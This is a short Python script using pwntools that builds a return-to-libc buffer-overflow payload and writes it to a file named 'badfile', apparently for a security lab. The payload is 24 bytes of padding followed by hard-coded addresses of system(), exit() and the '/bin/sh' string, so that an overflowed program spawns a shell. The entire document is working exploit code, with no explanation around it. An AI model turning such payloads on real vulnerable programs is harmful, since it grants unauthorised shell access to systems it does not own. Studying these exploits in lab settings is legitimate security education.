import os
os.environ['PWNLIB_NOTERM'] = 'True'
from pwn import *

system = 0xf7e0b350
binsh = 0xf7f5632b
exit = 0xf7dfdaf0

with open('badfile', 'wb') as f:
    f.write(b'A' * 24 + p32(system) + p32(exit) + p32(binsh))
